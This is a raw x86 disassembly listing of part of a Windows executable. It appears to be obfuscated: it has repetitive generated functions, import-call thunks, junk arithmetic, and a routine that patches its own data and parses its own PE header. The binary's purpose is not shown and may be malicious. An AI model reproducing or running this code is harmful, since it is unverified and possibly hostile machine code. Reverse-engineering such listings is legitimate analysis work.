  4d0787:	pop    esi
  4d0788:	mov    edi,0x0
  4d078d:	push   edi
  4d078e:	call   0x4d0dd8
  4d0793:	add    esp,0x4
  4d0796:	lea    edx,[esi-0x28]
  4d0799:	push   edx
  4d079a:	call   0x4d1278
  4d079f:	add    esp,0x4
  4d07a2:	test   eax,eax
  4d07a4:	jne    0x4d0797
  4d07a6:	add    esp,0x38
  4d07a9:	pop    ebp
  4d07aa:	ret    
  4d07ab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07b1:	sub    esp,0x3c
  4d07b4:	lea    ebx,ds:0x4d3184
  4d07ba:	adc    eax,edi
  4d07bc:	mov    edx,0x0
  4d07c1:	push   edx
  4d07c2:	call   0x4d0de4
  4d07c7:	add    esp,0x4
  4d07ca:	push   ebx
  4d07cb:	push   ecx
  4d07cc:	push   ecx
  4d07cd:	push   DWORD PTR [ebx+0x1b0]
  4d07d3:	call   0x4d07f0
  4d07d8:	add    esp,0xc
  4d07db:	pop    ebx
  4d07dc:	mov    ecx,0x4d203c
  4d07e1:	mov    ecx,DWORD PTR [ecx]
  4d07e3:	push   ecx
  4d07e4:	push   DWORD PTR [ebx]
  4d07e6:	pop    ecx
  4d07e7:	call   ecx
  4d07e9:	add    esp,0x3c
  4d07ec:	pop    ebp
  4d07ed:	ret    
  4d07ee:	add    BYTE PTR [eax],al
  4d07f0:	mov    edi,edi
  4d07f2:	push   ebp
  4d07f3:	mov    ebp,esp
  4d07f5:	sub    esp,0x30
  4d07f8:	mov    edx,0x4d3038
  4d07fd:	adc    DWORD PTR [ebp-0x8],edx
  4d0800:	push   edx
  4d0801:	mov    ecx,0xfffffff4
  4d0806:	push   ecx
  4d0807:	call   0x4d0f3c
  4d080c:	add    esp,0x4
  4d080f:	pop    edx
  4d0810:	push   edx
  4d0811:	push   DWORD PTR [edx+0xa0]
  4d0817:	push   DWORD PTR [edx+0x124]
  4d081d:	call   0x4d09d4
  4d0822:	add    esp,0x8
  4d0825:	pop    edx
  4d0826:	push   edx
  4d0827:	call   0x4d0f48
  4d082c:	add    esp,0x4
  4d082f:	pop    edx
  4d0830:	add    esp,0x30
  4d0833:	pop    ebp
  4d0834:	ret    
  4d0835:	add    BYTE PTR [eax],al
  4d0837:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d083d:	sub    esp,0x40
  4d0840:	lea    ecx,[edx-0x1cc]
  4d0846:	adc    DWORD PTR [ebp-0x40],ecx
  4d0849:	push   ecx
  4d084a:	mov    edi,0x0
  4d084f:	push   edi
  4d0850:	call   0x4d103c
  4d0855:	add    esp,0x4
  4d0858:	pop    ecx
  4d0859:	push   ecx
  4d085a:	push   ebx
  4d085b:	push   DWORD PTR [ecx+0xa0]
  4d0861:	call   0x4d11d0
  4d0866:	add    esp,0x8
  4d0869:	pop    ecx
  4d086a:	push   ecx
  4d086b:	mov    esi,0x0
  4d0870:	push   esi
  4d0871:	call   0x4d0e8c
  4d0876:	add    esp,0x4
  4d0879:	pop    ecx
  4d087a:	add    esp,0x40
  4d087d:	pop    ebp
  4d087e:	ret    
  4d087f:	add    BYTE PTR [edi-0x1],bl
  4d0882:	adc    eax,0x4d2020
  4d0887:	call   edi
  4d0889:	add    BYTE PTR [eax],al
  4d088b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0891:	sub    esp,0x4c
  4d0894:	mov    esi,0x4d3154
  4d0899:	xor    ecx,DWORD PTR [ebp-0x40]
  4d089c:	mov    ebx,0x0
  4d08a1:	push   ebx
  4d08a2:	call   0x4d1024
  4d08a7:	add    esp,0x4
  4d08aa:	push   esi
  4d08ab:	push   DWORD PTR [esi+0xb4]
  4d08b1:	push   ecx
  4d08b2:	push   DWORD PTR [esi+0x1bc]
  4d08b8:	call   0x4d0fa8
  4d08bd:	add    esp,0xc
  4d08c0:	pop    esi
  4d08c1:	push   0x0
  4d08c3:	call   0x4d0de4
  4d08c8:	add    esp,0x4
  4d08cb:	add    esp,0x4c
  4d08ce:	pop    ebp
  4d08cf:	ret    
  4d08d0:	mov    edi,edi
  4d08d2:	push   ebp
  4d08d3:	mov    ebp,esp
  4d08d5:	sub    esp,0x54
  4d08d8:	lea    edi,[ebx+0x34]
  4d08db:	and    esi,DWORD PTR [ebp-0xc]
  4d08de:	push   edi
  4d08df:	mov    edx,0x0
  4d08e4:	push   edx
  4d08e5:	call   0x4d1024
  4d08ea:	add    esp,0x4
  4d08ed:	pop    edi
  4d08ee:	push   edi
  4d08ef:	push   DWORD PTR [edi+0x1e8]
  4d08f5:	push   DWORD PTR [edi+0xa8]
  4d08fb:	call   0x4d0c1c
  4d0900:	add    esp,0x8
  4d0903:	pop    edi
  4d0904:	push   edi
  4d0905:	push   0x0
  4d0907:	call   0x4d103c
  4d090c:	add    esp,0x4
  4d090f:	pop    edi
  4d0910:	add    esp,0x54
  4d0913:	pop    ebp
  4d0914:	ret    
  4d0915:	add    BYTE PTR [eax],al
  4d0917:	add    BYTE PTR [edi-0x1],bl
  4d091a:	adc    eax,0x4d2060
  4d091f:	call   edi
  4d0921:	add    BYTE PTR [eax],al
  4d0923:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0929:	sub    esp,0x2c
  4d092c:	mov    esi,0x4d30e0
  4d0931:	adc    DWORD PTR [esi+0x7c],0x2584
  4d0938:	lea    edi,[esi-0xe0]
  4d093e:	push   edi
  4d093f:	call   0x4d1278
  4d0944:	add    esp,0x4
  4d0947:	test   eax,eax
  4d0949:	jne    0x4d0939
  4d094b:	push   esi
  4d094c:	push   ecx
  4d094d:	push   DWORD PTR [esi+0x110]
  4d0953:	push   edi
  4d0954:	call   0x4d0d08
  4d0959:	add    esp,0xc
  4d095c:	pop    esi
  4d095d:	lea    eax,[esi-0xe0]
  4d0963:	push   eax
  4d0964:	call   0x4d1278
  4d0969:	add    esp,0x4
  4d096c:	test   eax,eax
  4d096e:	jne    0x4d095e
  4d0970:	add    esp,0x2c
  4d0973:	pop    ebp
  4d0974:	ret    
  4d0975:	add    BYTE PTR [eax],al
  4d0977:	add    BYTE PTR [edi-0x1],bl
  4d097a:	adc    eax,0x4d208c
  4d097f:	call   edi
  4d0981:	add    BYTE PTR [eax],al
  4d0983:	add    BYTE PTR [edi-0x1],bl
  4d0986:	adc    eax,0x4d2044
  4d098b:	call   edi
  4d098d:	add    BYTE PTR [eax],al
  4d098f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0995:	sub    esp,0x3c
  4d0998:	lea    esi,ds:0x4d30a0
  4d099e:	or     ebx,0xffffff87
  4d09a1:	push   esi
  4d09a2:	push   ebx
  4d09a3:	push   DWORD PTR [esi+0xe4]
  4d09a9:	push   DWORD PTR [esi+0x1f0]
  4d09af:	call   0x4d14f0
  4d09b4:	add    esp,0xc
  4d09b7:	pop    esi
  4d09b8:	push   0x0
  4d09ba:	call   0x4d1024
  4d09bf:	add    esp,0x4
  4d09c2:	push   0x0
  4d09c4:	call   0x4d0e8c
  4d09c9:	add    esp,0x4
  4d09cc:	add    esp,0x3c
  4d09cf:	pop    ebp
  4d09d0:	ret    
  4d09d1:	add    BYTE PTR [eax],al
  4d09d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09d9:	sub    esp,0x48
  4d09dc:	lea    esi,[edx+0x144]
  4d09e2:	or     DWORD PTR [esi-0xa0],0x3953
  4d09ec:	mov    eax,0x0
  4d09f1:	push   eax
  4d09f2:	call   0x4d1024
  4d09f7:	add    esp,0x4
  4d09fa:	push   esi
  4d09fb:	push   edx
  4d09fc:	push   DWORD PTR [esi+0x1a4]
  4d0a02:	call   0x4d10a4
  4d0a07:	add    esp,0x8
  4d0a0a:	pop    esi
  4d0a0b:	mov    eax,0xfffffff4
  4d0a10:	push   eax
  4d0a11:	call   0x4d0f3c
  4d0a16:	add    esp,0x4
  4d0a19:	add    esp,0x48
  4d0a1c:	pop    ebp
  4d0a1d:	ret    
  4d0a1e:	add    BYTE PTR [eax],al
  4d0a20:	mov    edi,edi
  4d0a22:	push   ebp
  4d0a23:	mov    ebp,esp
  4d0a25:	sub    esp,0x2c
  4d0a28:	lea    edi,ds:0x4d3070
  4d0a2e:	mov    DWORD PTR [ebp-0x2c],0xffffc28c
  4d0a35:	push   edi
  4d0a36:	push   ebx
  4d0a37:	push   DWORD PTR [edi+0x178]
  4d0a3d:	push   DWORD PTR [edi+0x19c]
  4d0a43:	call   0x4d0bcc
  4d0a48:	add    esp,0xc
  4d0a4b:	pop    edi
  4d0a4c:	push   edi
  4d0a4d:	call   0x4d0e68
  4d0a52:	add    esp,0x4
  4d0a55:	pop    edi
  4d0a56:	push   edi
  4d0a57:	push   0x0
  4d0a59:	call   0x4d103c
  4d0a5e:	add    esp,0x4
  4d0a61:	pop    edi
  4d0a62:	add    esp,0x2c
  4d0a65:	pop    ebp
  4d0a66:	ret    
  4d0a67:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a6d:	sub    esp,0x58
  4d0a70:	lea    eax,ds:0x4d31bc
  4d0a76:	sub    ecx,0xfffffff9
  4d0a79:	push   eax
  4d0a7a:	push   DWORD PTR [eax+0xec]
  4d0a80:	push   DWORD PTR [eax+0x1d8]
  4d0a86:	call   0x4d088c
  4d0a8b:	add    esp,0x8
  4d0a8e:	pop    eax
  4d0a8f:	push   eax
  4d0a90:	call   0x4d0f48
  4d0a95:	add    esp,0x4
  4d0a98:	pop    eax
  4d0a99:	push   eax
  4d0a9a:	call   0x4d0f48
  4d0a9f:	add    esp,0x4
  4d0aa2:	pop    eax
  4d0aa3:	add    esp,0x58
  4d0aa6:	pop    ebp
  4d0aa7:	ret    
  4d0aa8:	pop    edi
  4d0aa9:	call   DWORD PTR ds:0x4d207c
  4d0aaf:	call   edi
  4d0ab1:	add    BYTE PTR [eax],al
  4d0ab3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ab9:	sub    esp,0x40
  4d0abc:	mov    ecx,0x4d3064
  4d0ac1:	add    DWORD PTR [ecx+0x118],0xffffff8d
  4d0ac8:	push   ecx
  4d0ac9:	push   eax
  4d0aca:	push   eax
  4d0acb:	push   esi
  4d0acc:	call   0x4d0924
  4d0ad1:	add    esp,0xc
  4d0ad4:	pop    ecx
  4d0ad5:	push   ecx
  4d0ad6:	call   0x4d0e68
  4d0adb:	add    esp,0x4
  4d0ade:	pop    ecx
  4d0adf:	push   ecx
  4d0ae0:	mov    esi,0x0
  4d0ae5:	push   esi
  4d0ae6:	call   0x4d1584
  4d0aeb:	add    esp,0x4
  4d0aee:	pop    ecx
  4d0aef:	add    esp,0x40
  4d0af2:	pop    ebp
  4d0af3:	ret    
  4d0af4:	mov    edi,edi
  4d0af6:	push   ebp
  4d0af7:	mov    ebp,esp
  4d0af9:	sub    esp,0x5c
  4d0afc:	mov    eax,0x4d300c
  4d0b01:	and    DWORD PTR [eax+0x170],0x2d
  4d0b08:	push   eax
  4d0b09:	push   DWORD PTR [eax+0x110]
  4d0b0f:	push   DWORD PTR [eax+0x1c]
  4d0b12:	call   0x4d0b88
  4d0b17:	add    esp,0x8
  4d0b1a:	pop    eax
  4d0b1b:	push   eax
  4d0b1c:	push   0x0
  4d0b1e:	call   0x4d1024
  4d0b23:	add    esp,0x4
  4d0b26:	pop    eax
  4d0b27:	push   eax
  4d0b28:	mov    ebx,0x0
  4d0b2d:	push   ebx
  4d0b2e:	call   0x4d103c
  4d0b33:	add    esp,0x4
  4d0b36:	pop    eax
  4d0b37:	add    esp,0x5c
  4d0b3a:	pop    ebp
  4d0b3b:	ret    
  4d0b3c:	pop    edi
  4d0b3d:	call   DWORD PTR ds:0x4d20a0
  4d0b43:	call   edi
  4d0b45:	add    BYTE PTR [eax],al
  4d0b47:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b4d:	sub    esp,0x2c
  4d0b50:	lea    esi,ds:0x4d31e4
  4d0b56:	and    ecx,DWORD PTR [ebp-0x1c]
  4d0b59:	push   esi
  4d0b5a:	push   DWORD PTR [esi+0x188]
  4d0b60:	push   DWORD PTR [esi+0x1fc]
  4d0b66:	call   0x4d0d4c
  4d0b6b:	add    esp,0x8
  4d0b6e:	pop    esi
  4d0b6f:	push   0x0
  4d0b71:	call   0x4d0dd8
  4d0b76:	add    esp,0x4
  4d0b79:	push   0x0
  4d0b7b:	call   0x4d0dd8
  4d0b80:	add    esp,0x4
  4d0b83:	add    esp,0x2c
  4d0b86:	pop    ebp
  4d0b87:	ret    
  4d0b88:	mov    edi,edi
  4d0b8a:	push   ebp
  4d0b8b:	mov    ebp,esp
  4d0b8d:	sub    esp,0x5c
  4d0b90:	mov    ecx,0x4d3170
  4d0b95:	cmp    ecx,0x3efd
  4d0b9b:	jbe    0x4d0b8b
  4d0b9d:	push   ecx
  4d0b9e:	push   0x0
  4d0ba0:	call   0x4d0dd8
  4d0ba5:	add    esp,0x4
  4d0ba8:	pop    ecx
  4d0ba9:	push   ecx
  4d0baa:	push   edx
  4d0bab:	push   ebx
  4d0bac:	call   0x4d14a4
  4d0bb1:	add    esp,0x8
  4d0bb4:	pop    ecx
  4d0bb5:	push   ecx
  4d0bb6:	mov    edi,0x0
  4d0bbb:	push   edi
  4d0bbc:	call   0x4d1584
  4d0bc1:	add    esp,0x4
  4d0bc4:	pop    ecx
  4d0bc5:	add    esp,0x5c
  4d0bc8:	pop    ebp
  4d0bc9:	ret    
  4d0bca:	add    BYTE PTR [eax],al
  4d0bcc:	mov    edi,edi
  4d0bce:	push   ebp
  4d0bcf:	mov    ebp,esp
  4d0bd1:	sub    esp,0x4c
  4d0bd4:	lea    edx,[edi+0xd0]
  4d0bda:	sbb    DWORD PTR [edx-0xec],0xffffdf09
  4d0be4:	push   edx
  4d0be5:	push   esi
  4d0be6:	push   DWORD PTR [edx+0x118]
  4d0bec:	push   DWORD PTR [edx+0x4]
  4d0bef:	call   0x4d1284
  4d0bf4:	add    esp,0xc
  4d0bf7:	pop    edx
  4d0bf8:	push   edx
  4d0bf9:	push   0x0
  4d0bfb:	call   0x4d1024
  4d0c00:	add    esp,0x4
  4d0c03:	pop    edx
  4d0c04:	push   edx
  4d0c05:	mov    edi,0x0
  4d0c0a:	push   edi
  4d0c0b:	call   0x4d0e8c
  4d0c10:	add    esp,0x4
  4d0c13:	pop    edx
  4d0c14:	add    esp,0x4c
  4d0c17:	pop    ebp
  4d0c18:	ret    
  4d0c19:	add    BYTE PTR [eax],al
  4d0c1b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c21:	sub    esp,0x30
  4d0c24:	lea    eax,ds:0x4d31f4
  4d0c2a:	and    esi,0x3a
  4d0c2d:	push   eax
  4d0c2e:	push   DWORD PTR [eax+0x78]
  4d0c31:	push   DWORD PTR [eax+0x1d4]
  4d0c37:	push   esi
  4d0c38:	call   0x4d12c0
  4d0c3d:	add    esp,0xc
  4d0c40:	pop    eax
  4d0c41:	push   eax
  4d0c42:	push   0x0
  4d0c44:	call   0x4d0e80
  4d0c49:	add    esp,0x4
  4d0c4c:	pop    eax
  4d0c4d:	push   eax
  4d0c4e:	mov    edx,0x0
  4d0c53:	push   edx
  4d0c54:	call   0x4d13dc
  4d0c59:	add    esp,0x4
  4d0c5c:	pop    eax
  4d0c5d:	add    esp,0x30
  4d0c60:	pop    ebp
  4d0c61:	ret    
  4d0c62:	add    BYTE PTR [eax],al
  4d0c64:	mov    edi,edi
  4d0c66:	push   ebp
  4d0c67:	mov    ebp,esp
  4d0c69:	sub    esp,0x44
  4d0c6c:	lea    edi,[esi+0x110]
  4d0c72:	cmp    edi,0x4ba7
  4d0c78:	jbe    0x4d0c67
  4d0c7a:	push   edi
  4d0c7b:	push   ecx
  4d0c7c:	push   esi
  4d0c7d:	push   ecx
  4d0c7e:	push   ecx
  4d0c7f:	call   0x4d1398
  4d0c84:	add    esp,0x10
  4d0c87:	pop    edi
  4d0c88:	push   edi
  4d0c89:	lea    ecx,[edi-0x138]
  4d0c8f:	push   ecx
  4d0c90:	call   0x4d1278
  4d0c95:	add    esp,0x4
  4d0c98:	test   eax,eax
  4d0c9a:	jne    0x4d0c89
  4d0c9c:	pop    edi
  4d0c9d:	push   edi
  4d0c9e:	mov    eax,0x0
  4d0ca3:	push   eax
  4d0ca4:	call   0x4d0e08
  4d0ca9:	add    esp,0x4
  4d0cac:	pop    edi
  4d0cad:	add    esp,0x44
  4d0cb0:	pop    ebp
  4d0cb1:	ret    
  4d0cb2:	add    BYTE PTR [eax],al
  4d0cb4:	pop    edi
  4d0cb5:	call   DWORD PTR ds:0x4d2088
  4d0cbb:	call   edi
  4d0cbd:	add    BYTE PTR [eax],al
  4d0cbf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cc5:	sub    esp,0x54
  4d0cc8:	lea    edx,ds:0x4d31e8
  4d0cce:	and    esi,DWORD PTR [ebp-0x18]
  4d0cd1:	push   edx
  4d0cd2:	push   DWORD PTR [edx+0x90]
  4d0cd8:	push   DWORD PTR [edx+0xd4]
  4d0cde:	push   DWORD PTR [edx+0x190]
  4d0ce4:	call   0x4d0ef4
  4d0ce9:	add    esp,0xc
  4d0cec:	pop    edx
  4d0ced:	push   edx
  4d0cee:	call   0x4d0e68
  4d0cf3:	add    esp,0x4
  4d0cf6:	pop    edx
  4d0cf7:	push   edx
  4d0cf8:	push   0x0
  4d0cfa:	call   0x4d0de4
  4d0cff:	add    esp,0x4
  4d0d02:	pop    edx
  4d0d03:	add    esp,0x54
  4d0d06:	pop    ebp
  4d0d07:	ret    
  4d0d08:	mov    edi,edi
  4d0d0a:	push   ebp
  4d0d0b:	mov    ebp,esp
  4d0d0d:	sub    esp,0x5c
  4d0d10:	mov    eax,0x4d308c
  4d0d15:	mov    edx,0x5be8
  4d0d1a:	push   eax
  4d0d1b:	call   0x4d1098
  4d0d20:	add    esp,0x4
  4d0d23:	pop    eax
  4d0d24:	push   eax
  4d0d25:	push   DWORD PTR [eax+0x12c]
  4d0d2b:	push   edx
  4d0d2c:	push   DWORD PTR [eax+0x1a8]
  4d0d32:	call   0x4d0b48
  4d0d37:	add    esp,0xc
  4d0d3a:	pop    eax
  4d0d3b:	push   eax
  4d0d3c:	push   0x0
  4d0d3e:	call   0x4d13dc
  4d0d43:	add    esp,0x4
  4d0d46:	pop    eax
  4d0d47:	add    esp,0x5c
  4d0d4a:	pop    ebp
  4d0d4b:	ret    
  4d0d4c:	mov    edi,edi
  4d0d4e:	push   ebp
  4d0d4f:	mov    ebp,esp
  4d0d51:	sub    esp,0x20
  4d0d54:	lea    eax,[esi-0xe8]
  4d0d5a:	or     DWORD PTR [ebp-0x10],0x10ce
  4d0d61:	push   eax
  4d0d62:	call   0x4d1098
  4d0d67:	add    esp,0x4
  4d0d6a:	pop    eax
  4d0d6b:	push   eax
  4d0d6c:	push   edi
  4d0d6d:	push   DWORD PTR [eax+0xcc]
  4d0d73:	call   0x4d140c
  4d0d78:	add    esp,0x8
  4d0d7b:	pop    eax
  4d0d7c:	push   eax
  4d0d7d:	push   0x0
  4d0d7f:	call   0x4d0e08
  4d0d84:	add    esp,0x4
  4d0d87:	pop    eax
  4d0d88:	add    esp,0x20
  4d0d8b:	pop    ebp
  4d0d8c:	ret    
  4d0d8d:	add    BYTE PTR [eax],al
  4d0d8f:	add    BYTE PTR [edi+0x2b],dl
  4d0d92:	call   DWORD PTR [edi+0x57]
  4d0d95:	push   edi
  4d0d96:	push   edi
  4d0d97:	call   0x4d0f48
  4d0d9c:	sub    esp,0xfffffffc
  4d0d9f:	call   0x4d0984
  4d0da4:	push   0x2
  4d0da6:	xor    eax,eax
  4d0da8:	sub    eax,0x4d3030
  4d0dad:	neg    eax
  4d0daf:	push   0x0
  4d0db1:	lea    ecx,[eax+0x6]
  4d0db4:	add    BYTE PTR [ecx],0x41
  4d0db7:	push   eax
  4d0db8:	call   0x4d0f9c
  4d0dbd:	pop    edi
  4d0dbe:	pop    edi
  4d0dbf:	pop    edi
  4d0dc0:	lea    ecx,[eax+0x3b]
  4d0dc3:	mov    edi,DWORD PTR [ecx]
  4d0dc5:	lea    eax,[eax+edi*1]
  4d0dc8:	mov    eax,DWORD PTR [eax+0x28]
  4d0dcb:	pusha  
  4d0dcc:	mov    ah,0x45
  4d0dce:	sub    al,ah
  4d0dd0:	ja     0x4d07ac
  4d0dd6:	popa   
  4d0dd7:	ret    
  4d0dd8:	pop    edi
  4d0dd9:	call   DWORD PTR ds:0x4d2084
  4d0ddf:	call   edi
  4d0de1:	add    BYTE PTR [eax],al
  4d0de3:	add    BYTE PTR [edi-0x1],bl
  4d0de6:	adc    eax,0x4d2064
  4d0deb:	call   edi
  4d0ded:	add    BYTE PTR [eax],al
  4d0def:	add    BYTE PTR [edi-0x1],bl
  4d0df2:	adc    eax,0x4d2024
  4d0df7:	call   edi
  4d0df9:	add    BYTE PTR [eax],al
  4d0dfb:	add    BYTE PTR [edi-0x1],bl
  4d0dfe:	adc    eax,0x4d2040
  4d0e03:	call   edi
  4d0e05:	add    BYTE PTR [eax],al
  4d0e07:	add    BYTE PTR [edi-0x1],bl
  4d0e0a:	adc    eax,0x4d2004
  4d0e0f:	call   edi
  4d0e11:	add    BYTE PTR [eax],al
  4d0e13:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e19:	sub    esp,0x4c
  4d0e1c:	lea    edx,[eax+0xc8]
  4d0e22:	mov    DWORD PTR [ebp-0x28],ecx
  4d0e25:	push   edx
  4d0e26:	push   DWORD PTR [edx+0x1a4]
  4d0e2c:	push   ecx
  4d0e2d:	push   DWORD PTR [edx+0x164]
  4d0e33:	call   0x4d0734
  4d0e38:	add    esp,0xc
  4d0e3b:	pop    edx
  4d0e3c:	push   edx
  4d0e3d:	lea    ebx,[edx-0x124]
  4d0e43:	push   ebx
  4d0e44:	call   0x4d1278
  4d0e49:	add    esp,0x4
  4d0e4c:	test   eax,eax
  4d0e4e:	jne    0x4d0e3d
  4d0e50:	pop    edx
  4d0e51:	push   edx
  4d0e52:	mov    edi,0x0
  4d0e57:	push   edi
  4d0e58:	call   0x4d103c
  4d0e5d:	add    esp,0x4
  4d0e60:	pop    edx
  4d0e61:	add    esp,0x4c
  4d0e64:	pop    ebp
  4d0e65:	ret    
  4d0e66:	add    BYTE PTR [eax],al
  4d0e68:	pop    edi
  4d0e69:	call   DWORD PTR ds:0x4d201c
  4d0e6f:	call   edi
  4d0e71:	add    BYTE PTR [eax],al
  4d0e73:	add    BYTE PTR [edi-0x1],bl
  4d0e76:	adc    eax,0x4d2090
  4d0e7b:	call   edi
  4d0e7d:	add    BYTE PTR [eax],al
  4d0e7f:	add    BYTE PTR [edi-0x1],bl
  4d0e82:	adc    eax,0x4d2030
  4d0e87:	call   edi
  4d0e89:	add    BYTE PTR [eax],al
  4d0e8b:	add    BYTE PTR [edi-0x1],bl
  4d0e8e:	adc    eax,0x4d200c
  4d0e93:	call   edi
  4d0e95:	add    BYTE PTR [eax],al
  4d0e97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e9d:	sub    esp,0x20
  4d0ea0:	lea    ebx,[edx+0x28]
  4d0ea3:	add    DWORD PTR [ebp-0x14],0x32
  4d0ea7:	mov    edx,0x0
  4d0eac:	push   edx
  4d0ead:	call   0x4d0de4
  4d0eb2:	add    esp,0x4
  4d0eb5:	push   ebx
  4d0eb6:	push   DWORD PTR [ebx+0x128]
  4d0ebc:	push   DWORD PTR [ebx+0x11c]
  4d0ec2:	push   DWORD PTR [ebx+0xb4]
  4d0ec8:	push   DWORD PTR [ebx+0x1ec]
  4d0ece:	call   0x4d152c
  4d0ed3:	add    esp,0x10
  4d0ed6:	pop    ebx
  4d0ed7:	push   0x0
  4d0ed9:	call   0x4d0e80
  4d0ede:	add    esp,0x4
  4d0ee1:	add    esp,0x20
  4d0ee4:	pop    ebp
  4d0ee5:	ret    
  4d0ee6:	add    BYTE PTR [eax],al
  4d0ee8:	pop    edi
  4d0ee9:	call   DWORD PTR ds:0x4d2000
  4d0eef:	call   edi
  4d0ef1:	add    BYTE PTR [eax],al
  4d0ef3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ef9:	sub    esp,0x20
  4d0efc:	lea    ebx,[edx-0x184]
  4d0f02:	sub    DWORD PTR [ebp-0x10],0x36
  4d0f06:	mov    eax,0x0
  4d0f0b:	push   eax
  4d0f0c:	call   0x4d1024
  4d0f11:	add    esp,0x4
  4d0f14:	push   ebx
  4d0f15:	push   ecx
  4d0f16:	push   DWORD PTR [ebx+0x24]
  4d0f19:	call   0x4d076c
  4d0f1e:	add    esp,0x8
  4d0f21:	pop    ebx
  4d0f22:	call   0x4d0f48
  4d0f27:	add    esp,0x4
  4d0f2a:	add    esp,0x20
  4d0f2d:	pop    ebp
  4d0f2e:	ret    
  4d0f2f:	add    BYTE PTR [edi-0x1],bl
  4d0f32:	adc    eax,0x4d2080
  4d0f37:	call   edi
  4d0f39:	add    BYTE PTR [eax],al
  4d0f3b:	add    BYTE PTR [edi-0x1],bl
  4d0f3e:	adc    eax,0x4d2028
  4d0f43:	call   edi
  4d0f45:	add    BYTE PTR [eax],al
  4d0f47:	add    BYTE PTR [edi-0x1],bl
  4d0f4a:	adc    eax,0x4d2034
  4d0f4f:	call   edi
  4d0f51:	add    BYTE PTR [eax],al
  4d0f53:	add    BYTE PTR [edi-0x1],bl
  4d0f56:	adc    eax,0x4d205c
  4d0f5b:	call   edi
  4d0f5d:	add    BYTE PTR [eax],al
  4d0f5f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f65:	sub    esp,0x60
  4d0f68:	mov    edx,0x4d3024
  4d0f6d:	sub    edi,edx
  4d0f6f:	push   edx
  4d0f70:	call   0x4d0e68
  4d0f75:	add    esp,0x4
  4d0f78:	pop    edx
  4d0f79:	push   edx
  4d0f7a:	push   eax
  4d0f7b:	push   esi
  4d0f7c:	push   DWORD PTR [edx+0x40]
  4d0f7f:	push   esi
  4d0f80:	call   0x4d0e98
  4d0f85:	add    esp,0x10
  4d0f88:	pop    edx
  4d0f89:	push   edx
  4d0f8a:	push   0x0
  4d0f8c:	call   0x4d0dfc
  4d0f91:	add    esp,0x4
  4d0f94:	pop    edx
  4d0f95:	add    esp,0x60
  4d0f98:	pop    ebp
  4d0f99:	ret    
  4d0f9a:	add    BYTE PTR [eax],al
  4d0f9c:	pop    edi
  4d0f9d:	call   DWORD PTR ds:0x4d202c
  4d0fa3:	call   edi
  4d0fa5:	add    BYTE PTR [eax],al
  4d0fa7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fad:	sub    esp,0x40
  4d0fb0:	mov    ecx,0x4d3194
  4d0fb5:	and    esi,0xc97
  4d0fbb:	push   ecx
  4d0fbc:	push   0x0
  4d0fbe:	call   0x4d1024
  4d0fc3:	add    esp,0x4
  4d0fc6:	pop    ecx
  4d0fc7:	push   ecx
  4d0fc8:	push   DWORD PTR [ecx+0x14]
  4d0fcb:	push   DWORD PTR [ecx+0x18]
  4d0fce:	push   DWORD PTR [ecx+0x144]
  4d0fd4:	call   0x4d0f60
  4d0fd9:	add    esp,0xc
  4d0fdc:	pop    ecx
  4d0fdd:	push   ecx
  4d0fde:	push   0x0
  4d0fe0:	call   0x4d0e8c
  4d0fe5:	add    esp,0x4
  4d0fe8:	pop    ecx
  4d0fe9:	add    esp,0x40
  4d0fec:	pop    ebp
  4d0fed:	ret    
  4d0fee:	add    BYTE PTR [eax],al
  4d0ff0:	mov    edi,edi
  4d0ff2:	push   ebp
  4d0ff3:	mov    ebp,esp
  4d0ff5:	sub    esp,0x4c
  4d0ff8:	lea    ebx,[edi+0x4]
  4d0ffb:	adc    ecx,esi
  4d0ffd:	push   0x0
  4d0fff:	call   0x4d0dd8
  4d1004:	add    esp,0x4
  4d1007:	push   ebx
  4d1008:	push   ecx
  4d1009:	push   DWORD PTR [ebx+0x68]
  4d100c:	call   0x4d1130
  4d1011:	add    esp,0x8
  4d1014:	pop    ebx
  4d1015:	push   0x0
  4d1017:	call   0x4d0e08
  4d101c:	add    esp,0x4
  4d101f:	add    esp,0x4c
  4d1022:	pop    ebp
  4d1023:	ret    
  4d1024:	pop    edi
  4d1025:	call   DWORD PTR ds:0x4d206c
  4d102b:	call   edi
  4d102d:	add    BYTE PTR [eax],al
  4d102f:	add    BYTE PTR [edi-0x1],bl
  4d1032:	adc    eax,0x4d2094
  4d1037:	call   edi
  4d1039:	add    BYTE PTR [eax],al
  4d103b:	add    BYTE PTR [edi-0x1],bl
  4d103e:	adc    eax,0x4d2018
  4d1043:	call   edi
  4d1045:	add    BYTE PTR [eax],al
  4d1047:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d104d:	sub    esp,0x48
  4d1050:	lea    edx,ds:0x4d3058
  4d1056:	adc    ecx,DWORD PTR [edx-0x20]
  4d1059:	push   edx
  4d105a:	lea    edi,[edx-0x58]
  4d105d:	push   edi
  4d105e:	call   0x4d1278
  4d1063:	add    esp,0x4
  4d1066:	test   eax,eax
  4d1068:	jne    0x4d105a
  4d106a:	pop    edx
  4d106b:	push   edx
  4d106c:	push   esi
  4d106d:	push   DWORD PTR [edx+0x20]
  4d1070:	push   ebx
  4d1071:	call   0x4d123c
  4d1076:	add    esp,0xc
  4d1079:	pop    edx
  4d107a:	push   edx
  4d107b:	push   0x0
  4d107d:	call   0x4d0dd8
  4d1082:	add    esp,0x4
  4d1085:	pop    edx
  4d1086:	add    esp,0x48
  4d1089:	pop    ebp
  4d108a:	ret    
  4d108b:	add    BYTE PTR [edi-0x1],bl
  4d108e:	adc    eax,0x4d2048
  4d1093:	call   edi
  4d1095:	add    BYTE PTR [eax],al
  4d1097:	add    BYTE PTR [edi-0x1],bl
  4d109a:	adc    eax,0x4d2038
  4d109f:	call   edi
  4d10a1:	add    BYTE PTR [eax],al
